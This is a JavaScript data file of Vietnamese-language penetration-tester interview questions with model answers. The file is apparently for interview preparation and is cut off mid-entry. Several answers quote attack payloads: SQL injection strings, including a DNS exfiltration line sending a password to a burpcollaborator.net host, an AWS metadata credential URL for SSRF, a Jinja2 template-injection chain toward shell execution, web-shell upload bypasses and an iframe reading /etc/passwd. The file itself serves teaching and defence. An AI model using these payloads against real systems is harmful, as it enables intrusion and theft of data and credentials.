const { q, SRC } = require('./fe_data.cjs');

const OFF_SRC = {
  owasp: "https://owasp.org/www-project-top-ten/",
  mitre_attack: "https://attack.mitre.org/",
  nist_pentest: "https://csrc.nist.gov/publications/detail/sp/800-115/final",
  portswigger: "https://portswigger.net/web-security",
  internal: "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
};

// 2. PENETRATION TESTER (PENTEST)
const pentestQuestions = [
  // Foundation (6)
  q("PENTEST-FOUND-01", "Penetration Tester (PenTest)", "foundation", "intermediate", "junior",
    "Phân biệt giữa Kiểm thử hộp đen (Black-box), Hộp xám (Gray-box) và Hộp trắng (White-box Testing) trong Penetration Testing. Tiêu chuẩn OSSTMM và OWASP Testing Guide định nghĩa các giai đoạn kiểm thử xâm nhập chuẩn mực như thế nào?",
    ["Black-box: Không có thông tin nội bộ trước, mô phỏng góc nhìn tin tặc bên ngoài; Gray-box: Cung cấp tài khoản người dùng thông thường và kiến trúc cơ bản; White-box: Cung cấp toàn bộ mã nguồn, tài liệu API và cấu hình mạng", "Các giai đoạn chuẩn: Trinh sát (Reconnaissance) -> Quét & Lập bản đồ (Scanning & Enumeration) -> Khai thác lỗ hổng (Exploitation) -> Khai thác sau xâm nhập (Post-Exploitation) -> Lập báo cáo kỹ thuật & khắc phục (Reporting)", "Mục tiêu tối thượng: Phát hiện bề mặt tấn công và chứng minh tác động thực tế qua chuỗi khai thác (Exploit Chain) có kiểm soát"],
    ["Tại sao Gray-box Testing thường được các doanh nghiệp lựa chọn nhiều nhất vì mang lại ROI cao nhất?", "Khái niệm 'Quy tắc giao chiến' (Rules of Engagement - RoE) có ý nghĩa pháp lý sống còn ra sao trước khi bắt đầu pentest?"] ,
    ["Black-box vs White-box", "OSSTMM", "OWASP WSTG", "Rules of Engagement", "Exploit Chain"],
    [OFF_SRC.owasp, OFF_SRC.nist_pentest],
    ["Tiến hành pentest vào hệ thống của khách hàng mà không có thỏa thuận pháp lý (RoE) bằng văn bản"]
  ),
  q("PENTEST-FOUND-02", "Penetration Tester (PenTest)", "foundation", "advanced", "middle",
    "Phân tích bản chất kỹ thuật của Lỗ hổng Tham chiếu đối tượng trực tiếp không an toàn (Insecure Direct Object References - IDOR) và Phân quyền mức đối tượng bị hỏng (Broken Object Level Authorization - BOLA theo OWASP API Security Top 10). Làm thế nào để tự động hóa hoặc tìm kiếm IDOR thủ công khi tham số định danh là chuỗi UUID khó đoán?",
    ["IDOR/BOLA xảy ra khi ứng dụng nhận ID thực thể từ người dùng (vd: `/api/orders?id=123`) mà không kiểm tra xem người dùng hiện tại có quyền sở hữu đơn hàng đó hay không", "Khi ID là UUID: tìm kiếm rò rỉ UUID từ các API endpoint khác (danh sách công khai, tìm kiếm bạn bè), hoán đổi UUID giữa hai tài khoản kiểm thử đã tạo sẵn", "Sử dụng các tiện ích Burp Suite mở rộng (như Autorize) để tự động gửi request của User A bằng phiên làm việc (Cookie/Token) của User B để phát hiện chênh lệch phản hồi"],
    ["Phân biệt giữa BOLA (kiểm soát đối tượng ngang hàng) và BFLA (Broken Function Level Authorization - kiểm soát chức năng dọc cấp quản trị)?", "Giải pháp khắc phục IDOR triệt để nhất ở tầng backend framework?"] ,
    ["IDOR", "BOLA", "OWASP API Top 10", "Autorize Extension", "Access Control"],
    [OFF_SRC.owasp, OFF_SRC.portswigger],
    ["Cho rằng thay đổi ID số tự tăng bằng chuỗi UUID ngẫu nhiên là đã khắc phục hoàn toàn lỗ hổng IDOR"]
  ),
  q("PENTEST-FOUND-03", "Penetration Tester (PenTest)", "foundation", "advanced", "middle",
    "Cơ chế tấn công Yêu cầu giả mạo từ phía máy chủ (Server-Side Request Forgery - SSRF): Phân biệt Basic SSRF và Blind SSRF. Kẻ tấn công khai thác SSRF như thế nào để đọc siêu dữ liệu đám mây (AWS/GCP Instance Metadata Service - IMDS) và chiếm đoạt IAM Role Credentials?",
    ["SSRF xảy ra khi máy chủ nhận một URL từ người dùng và tự động thực hiện HTTP request đến địa chỉ đó mà không kiểm duyệt chặt chẽ", "Khai thác đọc AWS IMDSv1: ép server gọi tới `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]` để lấy trộm Access Key tạm thời của máy chủ", "Blind SSRF: Máy chủ không trả nội dung phản hồi về màn hình; kẻ tấn công xác nhận bằng cách ép máy chủ gọi về máy chủ điều khiển (Burp Collaborator / Interactsh) qua giao diện DNS/HTTP"],
    ["Cơ chế phòng thủ AWS IMDSv2 (Session-oriented token) vô hiệu hóa kỹ thuật khai thác SSRF truyền thống ra sao?", "Các kỹ thuật vượt qua bộ lọc URL (Bypass URL Filter) bằng DNS Rebinding hoặc ký hiệu số thập phân của địa chỉ IP?"] ,
    ["SSRF", "Blind SSRF", "AWS Metadata IMDS", "DNS Rebinding", "Burp Collaborator"],
    [OFF_SRC.portswigger, OFF_SRC.owasp],
    ["Chỉ chặn tên miền `localhost` hoặc IP `127.0.0.1` bằng blacklist đơn giản dễ dàng bị qua mặt"]
  ),
  q("PENTEST-FOUND-04", "Penetration Tester (PenTest)", "foundation", "advanced", "senior_lead",
    "Bản chất kỹ thuật của Lỗ hổng Buôn lậu yêu cầu HTTP (HTTP Request Smuggling): Sự bất đồng bộ trong việc xử lý tiêu đề `Content-Length` (CL) và `Transfer-Encoding: chunked` (TE) giữa Reverse Proxy và Máy chủ phụ trợ (Backend Server) dẫn đến các biến thể CL.TE, TE.CL và TE.TE như thế nào?",
    ["Front-end proxy và Back-end server không thống nhất về ranh giới kết thúc của một HTTP request trong luồng kết nối TCP tái sử dụng (Keep-alive)", "CL.TE: Front-end dùng Content-Length còn Back-end dùng Transfer-Encoding; phần đuôi của request 1 bị cắt lại và dán vào đầu của request 2 của người dùng tiếp theo", "Hậu quả: Chiếm đoạt phiên làm việc của người dùng khác (Session Hijacking), vượt qua kiểm soát truy cập của WAF, hoặc đầu độc bộ nhớ đệm (Web Cache Poisoning)"],
    ["Tại sao việc nâng cấp toàn diện lên giao thức HTTP/2 hoặc HTTP/3 giúp triệt tiêu phần lớn các biến thể HTTP Request Smuggling?", "Kỹ thuật H2.CL và H2.TE Smuggling hoạt động ra sao khi front-end dùng HTTP/2 nhưng hạ cấp (Downgrade) sang HTTP/1.1 khi nói chuyện với backend?"] ,
    ["HTTP Request Smuggling", "CL.TE", "TE.CL", "Web Cache Poisoning", "HTTP/2 Downgrade"],
    [OFF_SRC.portswigger],
    ["Nhầm lẫn HTTP Request Smuggling với kỹ thuật tấn công HTTP Parameter Pollution (HPP) thông thường"]
  ),
  q("PENTEST-FOUND-05", "Penetration Tester (PenTest)", "foundation", "intermediate", "middle",
    "Cơ chế Khai thác Lỗ hổng Giải tuần tự hóa không an toàn (Insecure Deserialization): Khái niệm Gadget Chains (chuỗi các đoạn mã có sẵn trong thư viện ứng dụng) và cách kẻ tấn công xâu chuỗi chúng để đạt được Thực thi mã từ xa (RCE) trong Java (ysoserial), Python (pickle), hoặc PHP (unserialize)?",
    ["Deserialization biến đổi chuỗi byte/văn bản lưu trữ thành đối tượng (Object) trong bộ nhớ; nếu đối tượng được khởi tạo mà không kiểm tra lớp an toàn, các hàm ma thuật (Magic methods: `__wakeup`, `readObject`) sẽ tự động kích hoạt", "Gadget Chain: Lợi dụng các class hợp lệ có sẵn trong mã nguồn (vd: CommonsCollections trong Java) để xâu chuỗi lời gọi hàm từ khởi tạo đến việc gọi `Runtime.getRuntime().exec()`", "Hậu quả: Chiếm toàn quyền điều khiển máy chủ chỉ bằng cách gửi một payload đối tượng bị thao túng"],
    ["Tại sao việc dùng chữ ký số (HMAC signing) để bảo vệ chuỗi serialize chỉ là biện pháp phòng thủ một phần nếu khóa bí mật bị lộ?", "Tại sao nên chuyển đổi sang các định dạng dữ liệu thuần túy (JSON, Protocol Buffers) thay vì serialize nguyên cả đối tượng?"] ,
    ["Insecure Deserialization", "Gadget Chains", "ysoserial", "Magic Methods", "Remote Code Execution"],
    [OFF_SRC.owasp, OFF_SRC.portswigger],
    ["Nghĩ rằng chỉ cần lọc các từ khóa nguy hiểm trong chuỗi byte là có thể ngăn chặn deserialization attack"]
  ),
  q("PENTEST-FOUND-06", "Penetration Tester (PenTest)", "foundation", "intermediate", "junior",
    "Bản chất và phân loại Lỗ hổng Chèn mã kịch bản chéo trang (Cross-Site Scripting - XSS): Phân biệt Stored XSS, Reflected XSS và DOM-based XSS. Cơ chế bảo vệ của tiêu đề Chính sách bảo mật nội dung (Content Security Policy - CSP) và cờ HttpOnly trên Cookie giúp giảm thiểu tác hại của XSS ra sao?",
    ["Stored XSS: Mã độc được lưu vĩnh viễn vào DB của server và thực thi trên mọi người dùng xem trang; Reflected XSS: Mã độc nằm trong URL và phản xạ ngay lập tức; DOM XSS: Mã độc thực thi hoàn toàn ở client do JavaScript xử lý dữ liệu từ nguồn không an toàn (Source: location.hash -> Sink: innerHTML)", "HttpOnly: Ngăn JavaScript đọc Cookie chứa session token qua `document.cookie`, vô hiệu hóa kỹ thuật đánh cắp cookie trực tiếp", "CSP: Giới hạn các nguồn tài nguyên (script, style, image) được phép tải và cấm thực thi inline script (`unsafe-inline`)"],
    ["Làm thế nào kẻ tấn công có thể vượt qua (Bypass) một chính sách CSP được cấu hình lỏng lẻo bằng kỹ thuật JSONP hoặc Script Gadgets?", "Khái niệm 'Dangling Markup Injection' được dùng để trích xuất dữ liệu khi CSP cấm chạy script ra sao?"] ,
    ["XSS", "Stored vs DOM XSS", "Content Security Policy", "HttpOnly Cookie", "CSP Bypass"],
    [OFF_SRC.portswigger, OFF_SRC.owasp],
    ["Cho rằng đặt cờ HttpOnly là đã giải quyết triệt để vấn đề XSS và không cần mã hóa đầu ra (Contextual Output Encoding)"]
  ),

  // Practical Skills (8)
  q("PENTEST-SKILL-01", "Penetration Tester (PenTest)", "practical_skills", "advanced", "middle",
    "Sử dụng Burp Suite Professional chuyên sâu: Em cấu hình và khai thác tính năng Burp Match and Replace, Burp Infiltrator, viết quy tắc Burp Macro để tự động xử lý CSRF Token động / Bearer Token khi quét tự động bằng Burp Scanner ra sao?",
    ["Tạo Session Handling Rule trong Burp kết hợp Macro: mỗi khi gửi request, Burp tự động gửi một request phụ lấy CSRF token mới từ trang form và tiêm vào header/body của request chính", "Match and Replace: Tự động sửa đổi các headers đặc biệt (thêm User-Agent giả lập mobile, sửa Origin, gắn API Key đặc quyền) cho toàn bộ lưu lượng qua proxy", "Tận dụng Burp Extensions (Turbo Intruder viết bằng Python) để tấn công kiểm tra Race Condition với tốc độ hàng nghìn request trên cùng một socket kết nối"],
    ["Cách cấu hình Burp Suite để giải mã lưu lượng HTTPS trên ứng dụng di động có bật SSL Pinning (kết hợp Frida / Objection)?", "Làm thế nào để xuất báo cáo phát hiện lỗ hổng sạch sẽ từ Burp Suite phục vụ cho việc viết báo cáo chuyên nghiệp?"] ,
    ["Burp Suite Pro", "Session Handling Rules", "Burp Macros", "Turbo Intruder", "Race Condition Testing"],
    ["https://portswigger.net/burp/documentation", OFF_SRC.internal],
    ["Chỉ biết dùng Burp Suite ở mức độ bắt và sửa gói tin thủ công cơ bản mà không biết tự động hóa xử lý session"]
  ),
  q("PENTEST-SKILL-02", "Penetration Tester (PenTest)", "practical_skills", "advanced", "middle",
    "Khai thác Lỗ hổng SQL Injection nâng cao: Em sử dụng các kỹ thuật Blind SQLi dựa trên thời gian (Time-based), dựa trên điều kiện luận lý (Boolean-based), và OOB (Out-of-Band qua DNS exfiltration) như thế nào khi ứng dụng không hiển thị bất kỳ thông báo lỗi hay dữ liệu nào ra màn hình?",
    ["Boolean-based: Gửi các biểu thức điều kiện (vd: `' AND (SELECT SUBSTRING(password,1,1) FROM users)='a'--`) và quan sát sự khác biệt trong nội dung phản hồi (HTTP Status, kích thước trang hoặc sự hiện diện của một từ khóa)", "Time-based: Tiêm hàm gây trễ thời gian (vd: `pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`) và đo lường thời gian phản hồi của mạng để suy luận từng ký tự", "Out-of-Band (OOB): Kích hoạt máy chủ cơ sở dữ liệu thực hiện phân giải tên miền DNS chứa dữ liệu cần trích xuất (vd: `xp_dirtree '\\\\' + password + '.burpcollaborator.net\\test'`)"],
    ["Làm thế nào để viết script Python tối ưu thuật toán tìm kiếm nhị phân (Binary Search) nhằm trích xuất dữ liệu qua Time-based SQLi nhanh gấp 10 lần?", "Cách vượt qua các bộ lọc WAF cơ bản (sử dụng Inline Comments `/**/`, mã hóa URL kép, hoán đổi hàm tương đương)?"] ,
    ["Blind SQLi", "Time-based SQLi", "Out-of-Band SQLi", "DNS Exfiltration", "Binary Search Scripting"],
    [OFF_SRC.portswigger, OFF_SRC.owasp],
    ["Kết luận ứng dụng an toàn trước SQLi chỉ vì không thấy hiển thị lỗi cú pháp SQL Database Error trên màn hình"]
  ),
  q("PENTEST-SKILL-03", "Penetration Tester (PenTest)", "practical_skills", "advanced", "senior_lead",
    "Vượt qua cơ chế ghim chứng chỉ số SSL (Bypassing SSL Pinning) khi pentest ứng dụng di động Android và iOS: Em sử dụng Frida scripts, Objection và can thiệp mã nguồn tĩnh (Apktool reverse engineering) như thế nào để nghe lén và phân tích toàn bộ lưu lượng API của ứng dụng?",
    ["Android: Khởi chạy Frida server trên thiết bị đã root/giả lập; tiêm Frida script hook vào các hàm kiểm tra chứng chỉ của thư viện mạng phổ biến (OkHttp3 CertificatePinner, TrustManagerImpl)", "Can thiệp tĩnh: Dùng Apktool giải nén APK -> Sửa tệp `res/xml/network_security_config.xml` cho phép tin cậy chứng chỉ người dùng cài đặt (User Certificates) -> Đóng gói và ký lại file APK (Uber-apk-signer)", "iOS: Sử dụng Objection trên thiết bị Jailbreak chạy lệnh `ios sslpinning disable` để hook vào Security Framework"],
    ["Cách xử lý khi ứng dụng di động có cơ chế tự phát hiện Root/Jailbreak và tự động thoát app (Root Detection Evasion)?", "Làm thế nào để phân tích mã nhị phân Native C/C++ (JNI libraries) bằng Ghidra khi logic kiểm tra pinning được viết bằng mã máy?"] ,
    ["SSL Pinning Bypass", "Frida", "Objection", "Apktool", "Mobile Penetration Testing"],
    ["https://frida.re/", "https://mas.owasp.org/"],
    ["Bỏ cuộc không thể pentest API di động khi gặp ứng dụng có bật SSL Pinning"]
  ),
  q("PENTEST-SKILL-04", "Penetration Tester (PenTest)", "practical_skills", "advanced", "middle",
    "Khai thác Lỗ hổng Xác thực JWT (JSON Web Tokens): Các kỹ thuật tấn công phổ biến như: Đổi thuật toán sang `none` (None Algorithm), Đánh tráo khóa công khai thành khóa bí mật (HMAC/RSA Key Confusion), và Bẻ khóa khóa bí mật yếu (Weak Secret Cracking với hashcat/jwt-tool)?",
    ["None Algorithm: Thay đổi trường `alg` trong header thành `none` và xóa bỏ chữ ký ở phần cuối token nếu thư viện backend lỏng lẻo chấp nhận token không có chữ ký", "Key Confusion: Server dùng RSA (Public Key để verify, Private Key để ký); kẻ tấn công lấy Public Key công khai của server làm khóa bí mật và ký token bằng thuật toán đối xứng HS256", "Weak Secret: Sử dụng Hashcat hoặc jwt-tool tấn công từ điển bẻ khóa HMAC secret trong vài giây nếu lập trình viên đặt khóa bí mật ngắn (vd: 'secret', 'jwtkey')"],
    ["Làm thế nào để khai thác tham số `jwk` (JSON Web Key) hoặc `jku` trong header JWT để ép server tin cậy khóa công khai do kẻ tấn công tự sinh?", "Khái niệm JWT Kid Injection (Directory Traversal hoặc SQLi trong tham số `kid`) hoạt động ra sao?"] ,
    ["JWT Exploitation", "None Algorithm", "Key Confusion", "Hashcat", "JWT-tool"],
    [OFF_SRC.portswigger, "https://jwt.io/"],
    ["Nghĩ rằng JWT đã được mã hóa dữ liệu bí mật và không thể bị sửa đổi phần payload"]
  ),
  q("PENTEST-SKILL-05", "Penetration Tester (PenTest)", "practical_skills", "intermediate", "middle",
    "Kỹ thuật Khám phá và Trinh sát bề mặt tấn công mở rộng (OSINT & Attack Surface Mapping): Em kết hợp các công cụ tìm kiếm subdomain (Amass, Subfinder), dò quét dịch vụ (Nmap, Masscan) và phân tích lịch sử kho lưu trữ (Waybackurls, GAU) như thế nào để phát hiện các endpoint ẩn hoặc môi trường thử nghiệm bị bỏ quên?",
    ["Thu thập Subdomains thụ động (Passive OSINT qua Certificate Transparency logs, VirusTotal, Shodan) kết hợp vét cạn chủ động (DNS Brute-forcing với từ điển phong phú)", "Phân giải IP và lọc máy chủ còn hoạt động bằng httpx; quét cổng nhanh bằng Masscan rồi kiểm tra chi tiết dịch vụ bằng Nmap scripts (-sV -sC)", "Đào xới kho lưu trữ lịch sử web (Wayback Machine, Common Crawl) để tìm các endpoint API cũ, file cấu hình sao lưu (.bak, .old) hoặc file tài liệu swagger/openapi nội bộ"],
    ["Làm thế nào để tìm kiếm các S3 Buckets / Cloud Storage bị cấu hình mở công khai thuộc về tổ chức mục tiêu?", "Cách khai thác Google Dorks chuyên sâu để phát hiện tài liệu mật hoặc trang đăng trị quản trị bị lộ?"] ,
    ["OSINT", "Subdomain Enumeration", "Nmap", "Attack Surface Mapping", "Waybackurls"],
    ["https://nmap.org/", OFF_SRC.internal],
    ["Chỉ quét duy nhất tên miền chính của công ty và bỏ qua hàng chục subdomains phụ chứa môi trường thử nghiệm đầy lỗ hổng"]
  ),
  q("PENTEST-SKILL-06", "Penetration Tester (PenTest)", "practical_skills", "advanced", "senior_lead",
    "Khai thác Lỗ hổng Chèn mẫu từ phía máy chủ (Server-Side Template Injection - SSTI): Phân biệt SSTI và XSS. Em nhận diện Template Engine đang sử dụng (Jinja2, Twig, Freemarker, Velocity) qua cây quyết định cú pháp `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` và các bước leo thang lên Thực thi mã từ xa (RCE) ra sao?",
    ["SSTI xảy ra khi input người dùng được nối thẳng vào chuỗi template trên máy chủ thay vì truyền dưới dạng biến dữ liệu; XSS thực thi ở trình duyệt nạn nhân, còn SSTI thực thi mã lệnh trực tiếp trên máy chủ", "Cây quyết định: Gửi `${7*7}` nếu ra 49 thì có thể là Java/Freemarker; gửi `{{7*7}}` nếu ra 49 thì thử tiếp `{{7*'7'}}` (nếu ra 7777777 là Jinja2, nếu ra 49 là Twig)", "Leo thang RCE trong Jinja2 (Python): Đào bới cây phân cấp đối tượng từ chuỗi rỗng: `\"\".__class__.__mro__[1].__subclasses__()` để tìm class `subprocess.Popen` và thực thi lệnh shell"],
    ["Làm thế nào để khai thác SSTI trong môi trường template engine có bật chế độ hộp cát an toàn (Sandbox Evasion)?", "Sự khác biệt giữa SSTI và lỗ hổng Code Injection (eval injection)?"] ,
    ["SSTI", "Server-Side Template Injection", "Jinja2 RCE", "Payload Crafting", "Sandbox Escape"],
    [OFF_SRC.portswigger],
    ["Nhầm lẫn SSTI với XSS và chỉ cố gắng chèn thẻ `<script>alert(1)</script>` vào ô template"]
  ),
  q("PENTEST-SKILL-07", "Penetration Tester (PenTest)", "practical_skills", "intermediate", "middle",
    "Khai thác Lỗ hổng Tải tệp không an toàn (Unrestricted File Upload): Em vượt qua các tầng kiểm tra bảo vệ (Kiểm tra phần mở rộng đuôi file, Kiểm tra MIME-type trong Content-Type, và Kiểm tra Magic Bytes tiêu đề ảnh) như thế nào để tải lên một Web Shell thành công?",
    ["Vượt qua kiểm tra Extension: Thử các đuôi mở rộng thay thế (.php5, .phtml, .phar), kỹ thuật double extension (.php.png), hoặc ký tự null-byte trong hệ thống cũ (.php%00.jpg)", "Vượt qua kiểm tra Content-Type: Dùng Burp Suite sửa đổi header Content-Type thành `image/jpeg` hoặc `image/png` trong khi nội dung body là mã PHP/JSP shell", "Vượt qua kiểm tra Magic Bytes / GetImageSize: Chèn mã web shell độc hại vào phần bình luận (EXIF metadata / Comment section) của một bức ảnh GIF/JPEG hợp lệ hợp pháp (Polyglot File)"],
    ["Nếu máy chủ lưu file tải lên trên dịch vụ lưu trữ đám mây S3 độc lập, kẻ tấn công có thể biến lỗ hổng upload thành Stored XSS hoặc HTML Injection ra sao?", "Cách cấu hình an toàn cho thư mục lưu file upload để ngăn chặn hoàn toàn việc thực thi mã lệnh?"] ,
    ["File Upload Vulnerabilities", "Web Shell", "MIME-type Bypass", "Polyglot Images", "Magic Bytes"],
    [OFF_SRC.owasp, OFF_SRC.portswigger],
    ["Nghĩ rằng chỉ cần kiểm tra đuôi file ở phía client bằng JavaScript là máy chủ đã an toàn"]
  ),
  q("PENTEST-SKILL-08", "Penetration Tester (PenTest)", "practical_skills", "advanced", "middle",
    "Kỹ năng Viết Báo cáo Kiểm thử Xâm nhập Chuyên nghiệp (Penetration Testing Reporting): Em cấu trúc báo cáo như thế nào để phục vụ cả Ban Giám đốc (Executive Summary đánh giá rủi ro kinh doanh) và Đội ngũ Kỹ sư Lập trình (Technical Details, Mã chứng minh Proof-of-Concept, và Hướng dẫn khắc phục chi tiết từng dòng code)?",
    ["Executive Summary: Trực quan hóa rủi ro tổng thể, đánh giá tác động tài chính và pháp lý, xếp hạng độ trưởng thành an ninh của hệ thống, không dùng thuật ngữ kỹ thuật phức tạp", "Technical Findings: Mỗi lỗ hổng có cấu trúc chuẩn mực: Tiêu đề, Phân loại CVSS/CWE, Bằng chứng PoC từng bước có ảnh chụp và gói tin HTTP cụ thể (Steps to Reproduce), và Đánh giá khả năng khai thác thực tế", "Remediation: Cung cấp giải pháp sửa lỗi rõ ràng từng bước (code snippet an toàn, cấu hình chuẩn), phân biệt giữa giải pháp tình thế tức thời và giải pháp kiến trúc lâu dài"],
    ["Làm thế nào để giải thích cho khách hàng hiểu một chuỗi kết hợp nhiều lỗ hổng Low-severity có thể dẫn đến hậu quả Critical (Chaining Vulnerabilities)?", "Quy trình tổ chức buổi họp báo cáo kết quả (Readout Meeting) và kiểm tra xác minh lại (Retest Verification)?"] ,
    ["Penetration Testing Report", "Executive Summary", "Proof-of-Concept", "Vulnerability Chaining", "Technical Remediation"],
    [OFF_SRC.nist_pentest, OFF_SRC.internal],
    ["Sao chép nguyên xi văn bản mô tả lý thuyết từ công cụ quét vào báo cáo mà không có chứng cứ PoC thực tế"]
  ),

  // Scenario (6)
  q("PENTEST-SCEN-01", "Penetration Tester (PenTest)", "scenario", "advanced", "middle",
    "Tình huống: Trong một đợt kiểm thử xâm nhập ứng dụng Ngân hàng trực tuyến (Internet Banking), em phát hiện lỗ hổng IDOR cho phép xem chi tiết sao kê tài khoản của bất kỳ khách hàng nào bằng cách đổi số tài khoản trong request. Tuy nhiên, nếu tải hàng loạt dữ liệu thật để chứng minh thì sẽ vi phạm nghiêm trọng luật bảo vệ dữ liệu cá nhân. Em thực hiện chứng minh tác động (Proof-of-Concept) an toàn ra sao mà không làm lộ dữ liệu của khách hàng thật?",
    ["Tạo tối thiểu 2 tài khoản thử nghiệm hợp pháp thuộc phạm vi ủy quyền của đợt pentest (Account A và Account B)", "Chứng minh lỗ hổng bằng cách dùng phiên đăng nhập của Account A để truy cập và xem dữ liệu của chính Account B; chụp ảnh màn hình bằng chứng rõ ràng sự hoán đổi này", "Dừng ngay lập tức việc quét tự động hoặc vét cạn ID của khách hàng thật ngoài đời; che mờ (masking) các thông tin nhạy cảm ngẫu nhiên nếu vô tình nhìn thấy trong phản hồi và thông báo khẩn cấp cho khách hàng"],
    ["Tại sao nguyên tắc 'Không gây hại và không vi phạm dữ liệu thực tế' là lằn ranh đạo đức tối thượng của một Pentester chuyên nghiệp?", "Quy trình kích hoạt kênh thông báo lỗ hổng nghiêm trọng khẩn cấp (Emergency Out-of-Band Notification) trong vòng 1 giờ?"] ,
    ["Safe PoC", "Ethical Pentesting", "IDOR in Banking", "Data Privacy", "Rules of Engagement"],
    [OFF_SRC.internal, OFF_SRC.owasp],
    ["Tải về toàn bộ cơ sở dữ liệu của hàng nghìn khách hàng thật để khoe mẽ thành tích khai thác được"]
  ),
  q("PENTEST-SCEN-02", "Penetration Tester (PenTest)", "scenario", "advanced", "senior_lead",
    "Tình huống: Toàn bộ hệ thống web mục tiêu được bảo vệ sau dịch vụ Cloudflare WAF cấu hình rất chặt chẽ, mọi payload khai thác SQLi và XSS của em đều bị chặn với mã lỗi 403 Forbidden. Em áp dụng các kỹ thuật trinh sát và tìm kiếm máy chủ gốc (Origin IP Discovery) như thế nào để vượt qua hoàn toàn bức tường WAF?",
    ["Tìm kiếm địa chỉ IP gốc của máy chủ ẩn sau CDN: Kiểm tra lịch sử DNS cổ điển (SecurityTrails, ViewDNS, Shodan) trước khi hệ thống chuyển sang dùng Cloudflare", "Khai thác chức năng gửi email của hệ thống (Đăng ký tài khoản, Quên mật khẩu): nhận email và phân tích Header `Received: from` để tìm IP máy chủ gốc thực sự gửi thư", "Kiểm tra chứng chỉ số SSL qua Censys/Censys Search để tìm các máy chủ công khai đang sử dụng cùng chứng chỉ SSL của tên miền mục tiêu; sau đó gửi request trực tiếp tới IP gốc bằng cách gán Host Header"],
    ["Làm thế nào để khách hàng cấu hình tường lửa ở máy chủ gốc để chỉ chấp nhận kết nối từ các dải IP của Cloudflare nhằm vô hiệu hóa kỹ thuật này?", "Nếu không tìm được Origin IP, các phương pháp biến đổi cú pháp nâng cao để vượt qua bộ lọc WAF là gì?"] ,
    ["WAF Bypass", "Origin IP Discovery", "Cloudflare Bypass", "Censys Recon", "Host Header Injection"],
    [OFF_SRC.portswigger, OFF_SRC.internal],
    ["Bỏ cuộc ngay khi thấy WAF chặn mã lỗi 403 và báo cáo rằng hệ thống hoàn toàn không có lỗ hổng"]
  ),
  q("PENTEST-SCEN-03", "Penetration Tester (PenTest)", "scenario", "intermediate", "middle",
    "Tình huống: Khi kiểm thử một tính năng thanh toán giỏ hàng, em nhận thấy giao dịch mua hàng được xử lý qua 3 bước: 1. Tạo đơn hàng -> 2. Áp dụng mã giảm giá -> 3. Trừ tiền tài khoản. Em thiết kế bài kiểm tra điều kiện tranh đoạt (Race Condition) như thế nào để chứng minh một mã voucher chỉ dùng được 1 lần có thể bị áp dụng thành công 10 lần liên tiếp?",
    ["Sử dụng công cụ Turbo Intruder trong Burp Suite hoặc viết script Python đa luồng gửi đồng thời nhiều request áp dụng cùng 1 mã voucher", "Sử dụng kỹ thuật 'Single-packet attack' (Gửi 20 HTTP requests trong cùng một gói tin TCP hoặc trong cùng một khung HTTP/2) để tất cả requests tới máy chủ cùng một mili-giây", "Quan sát kết quả: nếu backend không sử dụng Database Locking (Pessimistic/Optimistic lock) hoặc Distributed Lock qua Redis, các luồng sẽ cùng đọc trạng thái voucher hợp lệ trước khi kịp cập nhật trạng thái 'Đã sử dụng'"],
    ["Làm thế nào để hướng dẫn lập trình viên sửa triệt để lỗi Race Condition này bằng giao dịch cơ sở dữ liệu (Database Transactions với Isolation Level)?", "Sự khác biệt giữa Race Condition dẫn đến sai lệch số dư tài chính và Race Condition dẫn đến vượt qua xác thực OTP?"] ,
    ["Race Condition", "Single-packet Attack", "Turbo Intruder", "Voucher Abuse", "Concurrency Exploitation"],
    [OFF_SRC.portswigger, OFF_SRC.internal],
    ["Chỉ thử nhập voucher bằng tay lần lượt từng lần một trên trình duyệt rồi kết luận hệ thống không có lỗi"]
  ),
  q("PENTEST-SCEN-04", "Penetration Tester (PenTest)", "scenario", "advanced", "senior_lead",
    "Tình huống: Em được giao kiểm thử xâm nhập mạng nội bộ của một doanh nghiệp theo phạm vi Hộp xám (Gray-box Internal Pentest). Khi cắm máy kiểm thử vào cổng mạng văn phòng, em chỉ được cấp một địa chỉ IP nội bộ không có quyền truy cập Internet. Các bước trinh sát mạng nội bộ (LLMNR/NBT-NS Poisoning với Responder, AS-REP Roasting, và tìm kiếm tài khoản dịch vụ không an toàn) của em diễn ra ra sao?",
    ["Lắng nghe lưu lượng mạng phát tán (Broadcast/Multicast): chạy công cụ Responder để đầu độc các yêu cầu phân giải tên miền LLMNR/NBT-NS và bắt giữ mã băm mật khẩu NTLMv2 hashes của người dùng nội bộ", "Thực hiện tấn công AS-REP Roasting nhắm vào các tài khoản Active Directory không bật tính năng xác thực trước Kerberos (Do not require Kerberos preauthentication) để lấy hash và bẻ khóa offline", "Dò quét tài nguyên chia sẻ mạng nội bộ mở công khai (SMB Shares) tìm kiếm các tệp cấu hình chứa mật khẩu quản trị viết cứng (.kdbx, .txt, scripts sao lưu)"],
    ["Làm thế nào để chuyển tiếp mã băm NTLM (NTLM Relay Attack) chiếm quyền máy chủ khác mà không cần bẻ khóa mật khẩu?", "Các biện pháp phòng thủ bắt buộc để vô hiệu hóa hoàn toàn LLMNR/NBT-NS trong toàn bộ mạng doanh nghiệp?"] ,
    ["Internal Pentest", "Responder", "LLMNR Poisoning", "AS-REP Roasting", "Active Directory Attacks"],
    [OFF_SRC.mitre_attack, OFF_SRC.internal],
    ["Chỉ quét cổng Nmap ồn ào làm kích hoạt hệ thống phát hiện xâm nhập và để lộ toàn bộ vị trí máy kiểm thử"]
  ),
  q("PENTEST-SCEN-05", "Penetration Tester (PenTest)", "scenario", "intermediate", "middle",
    "Tình huống: Khi kiểm tra một ứng dụng xử lý tài liệu, em phát hiện tính năng xuất file PDF từ nội dung HTML của người dùng sử dụng thư viện wkhtmltopdf phiên bản cũ. Em khai thác lỗ hổng này như thế nào để đọc các tệp tin hệ thống nhạy cảm (như `/etc/passwd` trên Linux hoặc `C:\\Windows\\win.ini` trên Windows)?",
    ["wkhtmltopdf sử dụng một trình duyệt WebKit không đầu (Headless WebKit) nội bộ để render HTML sang PDF", "Chèn thẻ HTML độc hại: `<iframe src=\"file:///etc/passwd\" width=\"800\" height=\"600\"></iframe>` hoặc dùng JavaScript đọc file cục bộ qua XMLHttpRequest", "Khi máy chủ xuất file PDF trả về cho người dùng, nội dung tệp tin mật hệ thống sẽ được render hiển thị trọn vẹn bên trong trang tài liệu PDF"],
